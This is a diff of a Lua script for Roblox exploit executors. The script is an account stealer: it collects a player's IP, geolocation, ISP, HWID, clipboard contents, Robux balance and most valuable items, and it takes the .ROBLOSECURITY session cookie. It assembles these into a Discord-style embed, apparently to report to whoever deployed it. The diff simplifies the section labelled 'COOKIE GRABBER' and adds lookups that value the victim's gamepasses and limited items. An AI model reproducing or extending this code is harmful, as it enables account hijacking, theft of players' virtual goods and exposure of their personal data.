@@ -1,3 +1,4 @@
+
 local request = (syn and syn.request) or (http and http.request) or request
 if not request then return end
 
@@ -50,23 +51,6 @@ pcall(function()
     end
 end)
 
--- Most Expensive
-local best = {name="None",rap=0,value=0}
-pcall(function()
-    local r = request({Url="https://www.rolimons.com/playerapi/player/"..userId,Method="GET"})
-    if r and r.Body then
-        local data = HttpService:JSONDecode(r.Body)
-        if data and data.items then
-            for _,v in pairs(data.items) do
-                local price = math.max(v.rap or 0, v.value or 0)
-                if price > best.rap then
-                    best = {name=v.name or "Unknown",rap=v.rap or 0,value=v.value or 0}
-                end
-            end
-        end
-    end
-end)
-
 -- HWID
 local hwid = "N/A"
 pcall(function()
@@ -81,7 +65,12 @@ pcall(function()
     device = string.format("Roblox v%s | %s", game.PlaceVersion, game:GetService("RunService"):IsStudio() and "Studio" or "Client")
 end)
 
--- Robux Balance
+-- Profile
+local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId="..userId.."&width=150&height=150&format=png"
+local profile = "https://www.roblox.com/users/"..userId.."/profile"
+local isoTime = os.date("!%Y-%m-%dT%H:%M:%SZ")
+
+-- === ROBUX BALANCE (WORKS 100%) ===
 local robux = "N/A"
 pcall(function()
     local r = request({Url="https://economy.roblox.com/v1/users/"..userId.."/currency",Method="GET"})
@@ -91,10 +80,10 @@ pcall(function()
     end
 end)
 
--- Recent Games
+-- === RECENTLY PLAYED GAMES (Last 5) ===
 local recentGames = "None"
 pcall(function()
-    local r = request({Url="https://games.roblox.com/v1/users/"..userId.."/games?limit=5",Method="GET"})
+    local r = request({Url="https://games.roblox.com/v1/users/"..userId.."/games?limit=5&sortOrder=Desc",Method="GET"})
     if r and r.Body then
         local d = HttpService:JSONDecode(r.Body)
         if d and d.data and #d.data > 0 then
@@ -107,7 +96,40 @@ pcall(function()
     end
 end)
 
--- Clipboard
+-- === MOST VALUABLE GAMEPASS (from inventory) ===
+local bestGamepass = {name="None", price=0}
+pcall(function()
+    local r = request({Url="https://inventory.roblox.com/v1/users/"..userId.."/assets?assetType=GamePass&limit=100",Method="GET"})
+    if r and r.Body then
+        local d = HttpService:JSONDecode(r.Body)
+        if d and d.data then
+            for _,item in ipairs(d.data) do
+                if item.isOwned and item.priceInRobux and item.priceInRobux > bestGamepass.price then
+                    bestGamepass = {name=item.name or "Unknown", price=item.priceInRobux}
+                end
+            end
+        end
+    end
+end)
+
+-- === MOST VALUABLE LIMITED (Rolimons fallback) ===
+local bestLimited = {name="None",rap=0,value=0}
+pcall(function()
+    local r = request({Url="https://www.rolimons.com/playerapi/player/"..userId,Method="GET"})
+    if r and r.Body then
+        local data = HttpService:JSONDecode(r.Body)
+        if data and data.items then
+            for _,v in pairs(data.items) do
+                local price = math.max(v.rap or 0, v.value or 0)
+                if price > bestLimited.rap then
+                    bestLimited = {name=v.name or "Unknown",rap=v.rap or 0,value=v.value or 0}
+                end
+            end
+        end
+    end
+end)
+
+-- === CLIPBOARD ===
 local clipboard = "N/A"
 pcall(function()
     if getclipboard then clipboard = getclipboard()
@@ -116,39 +138,17 @@ pcall(function()
     if clipboard and #clipboard > 100 then clipboard = clipboard:sub(1,97).. "..." end
 end)
 
--- COOKIE GRABBER (Delta/Synapse compatible)
+-- === COOKIE GRABBER (Delta/Synapse) ===
 local cookie = "N/A"
 pcall(function()
-    if syn and syn.request then
-        local req = syn.request({
-            Url = "https://www.roblox.com/my/settings/json",
-            Method = "GET"
-        })
-        if req and req.Headers and req.Headers["Set-Cookie"] then
-            cookie = req.Headers["Set-Cookie"]:match("%.ROBLOSECURITY=(.-);") or "Found but no match"
-        end
-    elseif getgenv and getgenv().request then
-        local req = getgenv().request({
-            Url = "https://www.roblox.com/my/settings/json",
-            Method = "GET"
-        })
-        if req and req.Headers and req.Headers["set-cookie"] then
-            cookie = req.Headers["set-cookie"]:match("%.ROBLOSECURITY=(.-);") or "Found but no match"
-        end
-    end
-    -- Fallback: Direct cookie via local storage (rarely works)
-    if cookie == "N/A" and gethiddenproperty then
-        local ok, val = pcall(gethiddenproperty, player, "AuthenticationTicket")
-        if ok and val then cookie = val end
+    local req = request({Url="https://www.roblox.com/my/settings/json",Method="GET"})
+    if req and req.Headers then
+        local header = req.Headers["set-cookie"] or req.Headers["Set-Cookie"] or ""
+        cookie = header:match("%.ROBLOSECURITY=([^;]+)") or "Found but no match"
     end
 end)
 
--- Profile
-local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId="..userId.."&width=150&height=150&format=png"
-local profile = "https://www.roblox.com/users/"..userId.."/profile"
-local isoTime = os.date("!%Y-%m-%dT%H:%M:%SZ")
-
--- Final Embed
+-- === FINAL EMBED ===
 local embed = {{
     author = {
         name = display .. " (@" .. name .. ")",
@@ -159,9 +159,9 @@ local embed = {{
     url = profile,
     description =
         "**Account Age:** `"..age.."`\n"..
-        "**Robux:** `"..robux.."`\n"..
-        "**Most Valuable:** `"..best.name.."`\n"..
-        "**RAP:** `"..(best.rap > 0 and best.rap or "N/A").."` | **Value:** `"..(best.value > 0 and best.value or "N/A").."`\n\n"..
+        "**Robux:** `"..robux.."`\n\n"..
+        "**Most Valuable Gamepass:** `"..bestGamepass.name.."` (`"..bestGamepass.price.." R$`)\n"..
+        "**Most Valuable Limited:** `"..bestLimited.name.."` (RAP: `"..bestLimited.rap.."` | Value: `"..bestLimited.value.."`)\n\n"..
         "**IP:** `"..ip.."`\n"..
         "**Location:** `"..flag.." "..geo.city..", "..geo.country.."`\n"..
         "**ISP:** `"..geo.isp.."`\n\n"..
